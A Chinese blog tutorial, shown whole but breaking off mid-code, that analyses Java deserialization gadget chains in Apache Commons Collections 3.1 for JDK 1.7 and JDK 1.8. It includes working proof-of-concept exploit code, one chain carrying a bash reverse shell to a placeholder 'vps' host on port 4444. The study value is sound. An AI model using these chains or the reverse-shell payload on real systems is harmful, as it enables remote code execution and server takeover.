src="https://img-blog.csdnimg.cn/13cdbe6f5635452ebd0122ef527efa9a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>感觉主要是要注意一些库中存在得反序列化漏洞。</p><p>注意找出反序列化函数调用点：</p><ul><li>ObjectInputStream.readObject</li><li>ObjectInputStream.readUnshared</li><li>XMLDecoder.readObject</li><li>yaml.load</li><li>XStream.fromXML</li><li>ObjectMapper.readValue</li><li>JSON.parseObject</li></ul><h2 id="关于java反射"><a href="#关于java反射" class="headerlink" title="关于java反射"></a>关于java反射</h2><p>参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448">https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448</a></p><p>反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。</p><p>正常情况下，如果我们要调用一个对象的方法，或者访问一个对象的字段，通常会传入对象实例：</p><figure class="highlight typescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs typescript"><span class="hljs-comment">// Main.java</span><br><span class="hljs-keyword">import</span> com.itranswarp.learnjava.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">getFullName</span>(<span class="hljs-params">Person p</span>)</span> &#123;<br>        <span class="hljs-keyword">return</span> p.getFirstName() + <span class="hljs-string">&quot; &quot;</span> + p.getLastName();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>但是，如果不能获得<code>Person</code>类，只有一个<code>Object</code>实例，比如这样：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">getFullName</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj</span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> ???<br>&#125;<br></code></pre></div></td></tr></table></figure><p>怎么办？有童鞋会说：强制转型啊！</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">getFullName</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj</span>)</span> &#123;<br>    Person p = (Person) obj;<br>    <span class="hljs-keyword">return</span> p.getFirstName() + <span class="hljs-string">&quot; &quot;</span> + p.getLastName();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>强制转型的时候，你会发现一个问题：编译上面的代码，仍然需要引用<code>Person</code>类。不然，去掉<code>import</code>语句，你看能不能编译通过？</p><p>所以，反射是为了解决在运行期，对某个实例一无所知的情况下，如何调用其方法。</p><p>关于反射的实例化一些方法</p><p><code>forName </code></p><p> forName是一个静态方法，其作用：通过调用来获取类名对应的Class对象，同时将Class对象加载进来。</p><p><code>newInstance</code></p><p>将对象实例化。返回类型为Object。与new的区别在于，new可以带参，而newInstance（）不可以，一边初始化无参类。通常与forName()配合使用。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String str = <span class="hljs-string">&quot;java.util.Date&quot;</span>;<br>Class cl1= Class.forName(str);<span class="hljs-comment">//加载java.util.Date类</span><br>Object obj = cl1.newInstance();<span class="hljs-comment">//实例化cl1</span><br></code></pre></div></td></tr></table></figure><p>最后一个是直接用new 来实例化也是很常用的方法。</p><p>还有一些关键的方法</p><p><code>getMethod()</code>  Method getMethod(String name,Class…parameterTypes)</p><p>getMethod方法与getField方法类似，getField方法根据表示域名的字符串，返回一个Field对象。而getMethod方法则根据方法名称和相关参数，来定位需要查找的Method对象并返回。</p><p>getMethod与getDeclareMethods方法的区别在于，后者返回一个Method对象数组，需要自己在结果中查找所需Method对象。</p><p><code>invoke</code>Object invoke（Object obj,Object…args）obj：实例化后的对象,args：用于方法调用的参数</p><p>调用包装在当前Method对象中的方法</p><p>常用的还有<strong>java.lang.Class.getMethod（）</strong></p><h2 id="反序列化一般攻击过程"><a href="#反序列化一般攻击过程" class="headerlink" title="反序列化一般攻击过程"></a>反序列化一般攻击过程</h2><p>在开始之前我们需要理一下反序列化漏洞的攻击流程：</p><ol><li>客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码）</li><li>exp发送到服务端，进入一个服务端自主复写（也可能是也有组件复写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层）</li><li>这个恶意数据exp_1在接下来的处理流程(可能是在自主复写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3……</li><li>最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。</li></ol><p>那么以上大概可以分成三个主要部分：</p><ol><li>payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；我把它称为：payload</li><li>反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链)</li><li>readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称…</li></ol><h2 id="初试CC3-1反序列化漏洞"><a href="#初试CC3-1反序列化漏洞" class="headerlink" title="初试CC3.1反序列化漏洞"></a>初试CC3.1反序列化漏洞</h2><p>看cc库漏洞之前得先了解了解cc库得一下接口和函数得实现。</p><p>这里Map类是存储键值对的数据结构，Apache Commons Collections中实现了类TransformedMap，用来对Map进行某种变换，只要调用decorate()函数，传入key和value的变换函数Transformer，即可从任意Map对象生成相应的TransformedMap，decorate()函数如下</p><p><img src="https://img-blog.csdnimg.cn/a5cc0eca263b485c8521ffece0db2b6d.png" alt="在这里插入图片描述"></p><p>Transformer是一个接口，其中定义的transform()函数用来将一个对象转换成另一个对象。如下所示：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Transformer</span> </span>&#123;  <br><br> <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span></span>;  <br><br>&#125; <br></code></pre></div></td></tr></table></figure><p>当Map中的任意项的Key或者Value被修改，相应的Transformer就会被调用。除此以外，多个Transformer还能串起来，形成ChainedTransformer。</p><p>Apache Commons Collections中已经实现了一些常见的Transformer，其中有一个可以通过调用Java的反射机制来调用任意函数，叫做InvokerTransformer。这也是这个漏洞触发得核心。看一下InvokerTransformer的源码定义</p><h3 id="poc链分析"><a href="#poc链分析" class="headerlink" title="poc链分析"></a>poc链分析</h3><h4 id="JDK1-7利用链"><a href="#JDK1-7利用链" class="headerlink" title="JDK1.7利用链"></a>JDK1.7利用链</h4><p>先看一下核心得触发漏洞得地方</p><p><img src="https://img-blog.csdnimg.cn/9414e8841c984f0fbb589605d577b0e0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这里得三个参数都是我们可控的，可以看到 InvokerTransformer 类中实现的 transform() 接口使用 Java 反射机制获取反射对象 input 中的参数类型为 iParamTypes 的方法 iMethodName，然后使用对应参数 iArgs 调用获取的方法，并将执行结果返回。由于其实现了 Serializable 接口，因此其中的三个必要参数 iMethodName、iParamTypes 和 iArgs 都是可以通过序列化直接构造的，为命令执行创造的决定性的条件。</p><p>然后要想利用 InvokerTransformer 类中的 transform() 来达到任意命令执行，还需要一个入口点，使得应用在反序列化的时候能够通过一条调用链来触发 InvokerTransformer 中的 transform() 接口。这里寻找过后发现了<code>TransformedMap</code>下存在<code>put</code>方法</p><p><img src="https://img-blog.csdnimg.cn/998ab566576542a4ac33ac4fd1a22d22.png" alt="在这里插入图片描述"></p><p>跟进后可以发现这里存在调用transform函数只需要将成员变量里的一个<code>valuetransformer</code>设置为一个<code>InvokerTransformer</code>类即可触发</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106222354207.png" alt="image-20211106222354207"></p><p>还有一些细节的东西，这里直接看pop链。这里为了最后能够获得<code>exec</code>函数执行命令，需要调用多次反射，所以需要将多个 InvokerTransformer 实例级联在一起组成一个 ChainedTransformer 对象，在其调用的时候会进行一个级联 transform() 调用：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CC3_1.serialize;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">commons_collections_3_1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] test = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/vps/4444 0&gt;&amp;1&quot;</span>&#125;<br>                )<br>                &#125;;<br>        Transformer transformerChain =<span class="hljs-keyword">new</span> ChainedTransformer(test);<br><br>        Map tempMap = <span class="hljs-keyword">new</span> HashMap&lt;String, Object&gt;();<br>        Map&lt;String, Object&gt; exMap = TransformedMap.decorate(tempMap, <span class="hljs-keyword">null</span>, transformerChain);<br>        exMap.put(<span class="hljs-string">&quot;1111&quot;</span>, <span class="hljs-string">&quot;2222&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>跟进到put函数时栈情况</p><p><img src="https://img-blog.csdnimg.cn/c831b5c2aa304e578922ba3cb01e23a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>初始化时<code>Map&lt;String, Object&gt; exMap = TransformedMap.decorate(tempMap, null, transformerChain);</code>这里<code>this.valueTransformer</code>不为空所以进入到<code>transform</code>函数        </p><p><img src="https://img-blog.csdnimg.cn/e71c8b9720f448ba8096f27e1d089a39.png" alt="在这里插入图片描述"></p><p>多级链多次调用反射</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106223219346.png" alt="image-20211106223219346"></p><p>最后一次循环得到<code>exec</code>函数，这里的反射调用需要自己多多理解和调试一下。</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106223349029.png" alt="image-20211106223349029"></p><p>第二次循环传入<code>Runtime.class</code></p><p><img src="https://img-blog.csdnimg.cn/f572db9ed1e54a94bcc7f9092108bab6.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/f0ef144ac0274754bdf3e836f3da6b60.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>跳出第二次循环后获取到<code>Runtime.getRumtime()</code>对象</p><p><img src="https://img-blog.csdnimg.cn/fd0d79fca5894c95be0a521a1c2a858c.png" alt="在这里插入图片描述"></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211108154318110.png" alt="image-20211108154318110"></p><p>跳出后</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211108154342143.png" alt="image-20211108154342143"></p><p>进入最后一次循环</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211108154438113.png" alt="image-20211108154438113"></p><p>最终反弹到shell</p><p><img src="https://img-blog.csdnimg.cn/abb260c30635482bad208db339973ea6.png" alt="在这里插入图片描述"></p><p>整条链多调试和理解感觉还是很清晰和顺利的，这里网上似乎还有另一个方法。利用<code>Map.Entry</code>的<code>setValue</code>函数来触发漏洞，poc主函数如下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>&#125;;<br><br><span class="hljs-comment">//将transformers数组存入ChaniedTransformer这个继承类</span><br>Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br><span class="hljs-comment">//创建Map并绑定transformerChina</span><br>Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><span class="hljs-comment">//给予map数据转化链</span><br>Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);<br><span class="hljs-comment">//触发漏洞</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br><span class="hljs-comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br>onlyElement.setValue(<span class="hljs-string">&quot;foobar&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>关键在于AbstracInputCheckedMapDecorator.class类中的<code>setValue</code>会进入到<code>TransformedMap</code>中的<code>checkSetValue</code>,后面大致就一样了。</p><p><img src="https://img-blog.csdnimg.cn/3a829cbc792b48b682e508fccad5cc45.png" alt="在这里插入图片描述"></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106231618609.png" alt="image-20211106231618609"></p><p>我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Map.Entry 类型setValue(<span class="hljs-string">&quot;foobar&quot;</span>)<br>=&gt; AbstracInputCheckedMapDecorator.setValue()<br>=&gt; TransformedMap.checkSetValue()<br>=&gt; ChainedTransformer.transform(Object object)<br>    根据数组，先进入 =&gt; ConstantTransformer.transform(Object input)<br>    再进入 =&gt; InvokerTransformer.transform(Object input)<br></code></pre></div></td></tr></table></figure><p>获取exec的反射调用流程为</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br>.invoke(<br>Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>))<span class="hljs-comment">//此处在获取实例</span><br>,<br><span class="hljs-string">&quot;calc.exe&quot;</span><br>)<br></code></pre></div></td></tr></table></figure><p>但是到这里都还只是停留在本地测试出了命令执行，要想在 Java 应用反序列化的过程中触发该过程还需要找到一个类，它能够在反序列化调用 readObject() 的时候调用 TransformedMap 内置类 MapEntry 中的 setValue() 函数，这样才能构成一条完整的 Gadget 调用链。恰好在 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类具有 Map 类型的参数，并且在<code> readObject()</code> 方法中触发了上面所提到的所有条件，其源码如下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> </span>&#123;<br>        ...省略...<br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            String name = memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                Object value = memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) || value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>关键在于</p><p><code>memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(annotationType.members().get(name)));</code>调用了setValue函数，但是这是jdk1.7的版本，在jdk1.8中便不适用</p><p>也可以看看jdk1.8版本</p><p><img src="https://img-blog.csdnimg.cn/855de5736d904193835ae8bb04354f86.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h4 id="JDK1-8–LazyMap利用链"><a href="#JDK1-8–LazyMap利用链" class="headerlink" title="JDK1.8–LazyMap利用链"></a>JDK1.8–LazyMap利用链</h4><p>对于JDK 1.8来说，<code>AnnotationInvocationHandler</code>类中关键的触发点，setvalue发生了改变。所以我们需要寻找新的类重写readObject来实现调用，sda</p><h5 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">反序列化BadAttributeValueExpException<br>-&gt;BadAttributeValueExpException.readObject()<br>-&gt;TideMapEntry.toString()<br>-&gt;TideMapEntry.getValue()<br>-&gt;LazyMap.get()<br>-&gt;ChainedTransformer.transform()<br></code></pre></div></td></tr></table></figure><p>最后一个环节肯定还是要调用到<code>ChainedTransformer.transform()</code>这里，所以我们直接先看<code>LazyMap</code></p><p><img src="https://img-blog.csdnimg.cn/a5563b5b7fba4cbeaec95a5a3e34ba0c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/26d3aec379c24bde84c503834bc0db8e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>要调用到get函数就找到了<code>TiedMapEntry</code>类</p><p><img src="https://img-blog.csdnimg.cn/6ff9788c84014b709c714bae54d1a824.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>存在tostring</p><p><img src="https://img-blog.csdnimg.cn/8c8bd61ba9ff47ecbf930a5f18e6d1ea.png" alt="在这里插入图片描述"></p><p>跟进可以发现可利用的地方</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211108171802668.png" alt="image-20211108171802668"></p><p>最后需要一个类可以在反序列化重写readObject()时可以自动调用toString方法。完整的利用链就可以形成，这里找到了<code>BadAttributeValueExpException</code>类</p><p><img src="https://img-blog.csdnimg.cn/c971cf477da244b485c05947f40c17c7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>调试过jdk1.7这个其实也差不多了，没有那么难理解了，附上exp</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CC3_1.serialize;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">commons_collections_3_1_jdk1_8</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BadAttributeValueExpException <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> String[] execArgs = <span class="hljs-keyword">new</span> String[] &#123; command &#125;;<br>        <span class="hljs-comment">// inert chain for setup</span><br>        <span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                        String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<br>                        <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span 